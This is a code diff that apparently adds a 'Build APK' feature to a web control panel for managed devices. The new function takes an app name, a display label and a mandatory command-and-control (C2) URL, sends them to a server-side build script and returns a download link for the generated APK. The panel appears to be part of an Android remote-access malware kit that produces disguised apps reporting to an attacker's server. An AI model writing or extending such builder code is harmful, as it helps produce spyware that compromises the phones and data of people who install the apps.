@@ -14,6 +14,65 @@ function switchTab(tab) {
     TabsManager.switchTab(tab);
 }
 
+function buildApk() {
+    const apkName = document.getElementById('apkName').value.trim();
+    const appLabel = document.getElementById('appLabel').value.trim();
+    const c2Url = document.getElementById('c2Url').value.trim();
+    
+    if (!c2Url) {
+        alert('Please enter C2 URL');
+        return;
+    }
+    
+    const buildBtn = document.getElementById('buildBtn');
+    const statusDiv = document.getElementById('buildStatus');
+    const statusMsg = document.getElementById('statusMessage');
+    const downloadDiv = document.getElementById('downloadLink');
+    const buildLog = document.getElementById('buildLog');
+    
+    buildBtn.disabled = true;
+    buildBtn.textContent = 'Building...';
+    statusDiv.style.display = 'block';
+    statusMsg.textContent = 'Building APK, please wait... This may take a minute.';
+    statusMsg.style.color = '#333';
+    downloadDiv.style.display = 'none';
+    buildLog.textContent = '';
+    
+    fetch('api/build.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            apkName: apkName,
+            appLabel: appLabel,
+            c2Url: c2Url
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        buildBtn.disabled = false;
+        buildBtn.textContent = 'Build APK';
+        buildLog.textContent = data.log || '';
+        
+        if (data.success) {
+            statusMsg.textContent = 'Build successful!';
+            statusMsg.style.color = 'green';
+            downloadDiv.style.display = 'block';
+            document.getElementById('apkDownloadBtn').href = data.downloadUrl;
+        } else {
+            statusMsg.textContent = 'Build failed: ' + data.message;
+            statusMsg.style.color = 'red';
+        }
+    })
+    .catch(error => {
+        buildBtn.disabled = false;
+        buildBtn.textContent = 'Build APK';
+        statusMsg.textContent = 'Error: ' + error.message;
+        statusMsg.style.color = 'red';
+    });
+}
+
 function filterDevices() {
     DevicesManager.filter();
 }
